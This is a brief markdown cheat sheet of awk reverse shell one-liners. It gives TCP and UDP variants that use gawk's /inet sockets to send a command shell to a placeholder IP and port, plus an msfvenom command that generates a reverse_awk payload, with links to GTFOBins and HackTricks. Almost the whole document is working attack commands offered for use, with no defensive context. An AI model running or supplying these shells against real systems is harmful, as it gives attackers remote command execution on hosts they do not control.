# Awk

## 01 - TCP Method

```
$ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do { printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## 02 - UDP Method

```
$ awk 'BEGIN {s = "/inet/udp/0/<IP>/<PORT>"; while(42) { do { printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## 03 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>
```

---
## References

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### GTFOBins

- [GTFOBins: Awk](https://gtfobins.github.io/gtfobins/awk/)

- [GTFOBins: Gawk](https://gtfobins.github.io/gtfobins/gawk/)

- [GTFOBins: Nawk](https://gtfobins.github.io/gtfobins/nawk)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)